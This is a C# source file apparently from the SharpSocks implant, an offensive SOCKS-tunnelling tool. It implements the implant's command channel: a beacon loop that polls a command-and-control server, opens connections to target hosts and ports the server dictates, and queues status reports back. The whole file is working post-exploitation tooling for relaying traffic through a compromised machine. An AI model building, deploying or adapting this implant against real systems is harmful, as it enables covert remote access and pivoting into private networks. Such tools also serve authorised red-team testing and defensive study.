using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Xml.Linq;
using System.Xml.XPath;
using SharpSocksCommon;
using SharpSocksImplant.Config;
using SharpSocksImplant.Logging;
using SharpSocksImplant.Socks;

namespace SharpSocksImplant.Comms
{
    public class CommandChannelController
    {
        private readonly SocksLoopController _client;
        private readonly CommandCommunicationHandler _cmdCommsHandler;
        private readonly object _statusLocker = new object();
        private readonly List<XElement> _statusQueue = new List<XElement>();
        private readonly AutoResetEvent _timeout = new AutoResetEvent(false);

        public CommandChannelController(CommandChannelConfig c2Config, SocksLoopController client, CommandCommunicationHandler comms)
        {
            C2Config = c2Config;
            C2Config.CommandChannelSessionIdChanged += () => { };
            _client = client;
            _cmdCommsHandler = comms;
        }

        public IImplantLog ImplantComms { get; set; }

        private CommandChannelConfig C2Config { get; }

        private string CommandChannelSessionId => C2Config.CommandChannelSessionId;

        private Task CommandChannelLoop { get; set; }

        private CancellationTokenSource CancelTokenSource { get; set; }

        private CancellationToken CancelToken { get; set; }

        public void StopCommandChannel()
        {
            CancelTokenSource.Cancel();
        }

        public void StartCommandLoop(SocksController loopController)
        {
            CancelTokenSource = new CancellationTokenSource();
            CancelToken = CancelTokenSource.Token;
            CommandChannelLoop = new Task(action =>
            {
                try
                {
                    ImplantComms.LogImportantMessage($"Command loop starting - using beacon of {C2Config.CommandBeaconTime}ms");
                    if (CommandLoop((CancellationToken)action))
                        return;
                    loopController.StopProxyComms();
                    ImplantComms.LogError("Stopping all proxy comms as command channel is now broken");
                }
                catch (Exception e)
                {
                    ImplantComms.LogError($"Command Channel loop is broken {e}, hard stopping all connections");
                    loopController.StopProxyComms();
                }
            }, CancelToken);
            CommandChannelLoop.Start();
        }

        private bool CommandLoop(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                ImplantComms.LogMessage($"[{CommandChannelSessionId}][Implant -> SOCKS Server] Checking for new tasks");
                var responseData = _cmdCommsHandler.Send(CommandChannelSessionId, Encoding.UTF8.GetBytes(BuildRequestPayload().ToString()).ToList(), out var commandChannelDead);
                if (responseData == null || !responseData.Any() || commandChannelDead)
                {
                    if (!commandChannelDead) return true;
                    ImplantComms.LogError("Command Channel loop is dead. Exiting");
                    return false;
                }

                var parsedResponse = XDocument.Parse(Encoding.UTF8.GetString(responseData.ToArray()));
                var taskElements = parsedResponse.XPathSelectElements("Response/Tasks/Task");
                var taskElementsList = taskElements.ToList();
                if (taskElementsList.Any())
                {
                    ImplantComms.LogMessage($"{taskElementsList.Count} tasks received");
                    parsedResponse.XPathSelectElements("Response/Tasks/Task").ToList().ForEach(x =>
                    {
                        var createListenerElement = x.XPathSelectElement("CreateListener");
                        var closeListenerElement = x.XPathSelectElement("CloseListener");
                        if (createListenerElement != null)
                        {
                            var targetHost = createListenerElement.Attribute("TargetHost")?.Value;
                            var targetPortString = createListenerElement.Attribute("TargetPort")?.Value;
                            if (targetPortString != null)
                            {
                                var targetPort = ushort.Parse(targetPortString);
                                var sessionId = createListenerElement.Attribute("SessionID")?.Value;
                                ImplantComms.LogMessage($"About to open connection to {targetHost}:{targetPortString}");
                                if (_client.OpenNewConnectionToTarget(sessionId, targetHost, targetPort))
                                {
                                    QueueListenerStatus(sessionId, CommandChannelStatus.OPEN);
                                }
                                else
                                {
                                    ImplantComms.LogError($"Failed: {targetHost}:{targetPortString}");
                                    QueueListenerStatus(sessionId, CommandChannelStatus.FAILED);
                                }
                            }
                            else
                            {
                                ImplantComms.LogError("Target Port is null");
                            }
                        }
                        else
                        {
                            var sessionId = closeListenerElement?.Attribute("SessionID");
                            if (sessionId == null)
                                return;
                            if (!string.IsNullOrWhiteSpace(sessionId.Value))
                            {
                                ImplantComms.LogMessage($"[{sessionId.Value}][SOCKS Server -> Implant] Got close listener task");
                                QueueListenerStatus(sessionId.Value, CommandChannelStatus.CLOSED);
                            }
                            else
                            {
                                ImplantComms.LogError("Close session id message is null");
                            }
                        }
                    });
                }

                if (token.IsCancellationRequested)
                    return true;

                _timeout.WaitOne(C2Config.CommandBeaconTime);
                if (token.IsCancellationRequested)
                    return true;
            }

            return true;
        }

        private XElement BuildRequestPayload()
        {
            var xElement = new XElement("CommandChannel");
            lock (_statusLocker)
            {
                if (_statusQueue.Count > 0)
                {
                    var status = new XElement("ListenerStatus");
                    _statusQueue.ForEach(x => status.Add(x));
                    xElement.Add(status);
                    _statusQueue.Clear();
                }
            }

            xElement.Add(new XElement("RequestWork"));
            return xElement;
        }

        private void QueueListenerStatus(string listener, CommandChannelStatus status)
        {
            if (status == CommandChannelStatus.CLOSED || status == CommandChannelStatus.FAILED || status == CommandChannelStatus.CLOSING || status == CommandChannelStatus.TIMEOUT)
                _client.Stop(listener);
            lock (_statusLocker)
            {
                _statusQueue.Add(new XElement(new XElement("Status", new XAttribute("SessionID", listener), status)));
            }
        }
    }
}